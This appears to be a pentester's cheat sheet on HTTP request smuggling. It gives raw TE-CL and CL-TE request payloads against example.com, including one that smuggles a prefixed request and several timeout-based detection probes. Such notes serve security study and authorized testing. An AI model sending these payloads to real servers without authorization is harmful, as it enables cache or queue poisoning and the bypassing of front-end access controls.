### Request Smuggling

In Request Smuggline we try to find out if the Front-End parses headers differently than the backend.
RFC 2616 states "If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.""
So if we send the **Transfer-Encoding header** AND **Content-Length header** the front-end might parse one and the backend another.

TE - CL - Good!
CL - TE - Good!
CL - CL - Boring
TE - TE - Boring

#### Chunking
Each chunk consists of the chunk size, followed by a newline (\r\n), followed by the chunk contents. The message is terminated with a chunk of size 0.

If the front-end does not support chunnked encoding we can do
```bash
POST / HTTP/1.1
Host: example.com
Content-Length: 11
Transfer-Encoding: chunked
\r\n    # 1
7\r\n   # 2
A\r\n   # 2
P\r\n   # 2
0\r\n   # 2
\r\n    # 1

GPOST / HTTP/1.1    # The G is intentional and the rest
Host: example.com
```

If the back-end does not support chunked encdoing we flip it
```bash
POST / HTTP/1.1
Host: example.com
Content-Length: 3
Transfer-Encoding: chunked
\r\n    # 1
6\r\n   # 2
PREFIX\r\n  # Rest
0\r\n 

POST / HTTP/1.1
Host: example.com
```
The backend will wait (and time-out) for the next chunk to arrive

#### Detect TE - CL
```bash
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6
0\r\n   # 2 #Chunk size of 0 followed by \r\n indicates new chunk
\r\n    # 1
X
```
The backend will wait for the 'X' to arrive

#### Detect CL - TE
```bash
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4
1\r\n   # 2
Z\r\n   # 2
Q   # > Content-Length of 4
```

#### More Info
https://portswigger.net/web-security/request-smuggling
https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn